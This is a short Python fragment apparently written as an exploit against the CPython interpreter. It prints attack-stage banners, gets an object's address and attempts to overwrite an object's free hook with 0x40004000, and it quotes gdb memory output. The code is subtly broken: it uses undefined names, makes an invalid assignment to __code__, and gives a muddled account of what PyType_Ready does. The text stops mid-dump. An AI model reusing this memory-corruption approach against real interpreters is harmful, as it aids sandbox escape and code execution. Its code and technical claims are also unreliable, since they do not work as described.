fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi
fn()

print('[+] PyType_Ready')
# see https://github.com/python/cpython/blob/b0c685903e4f73415c0fafd2aa544b3c3b2ffa8e/Modules/_ctypes/callproc.c#L853
# PyType_Ready calls PyType_Modified, which will set Py_TPFLAGS_HEAPTYPE flag
# and make type is not a GC tracked object
PyType_Ready(cls)


print('[+] get object address')
# PyObject_GetAttrString returns the object address
obj_addr = id(PyObject_GetAttrString(m, 'o'))


print('[+] set free hook')
# change free hook of object to 0x40004000
# gdb-peda$ x/8wx 0x555555758068
# 0x555555758068:	0x00005555	0x00005555	0x00004000	0x00004000
# 0x5555557580
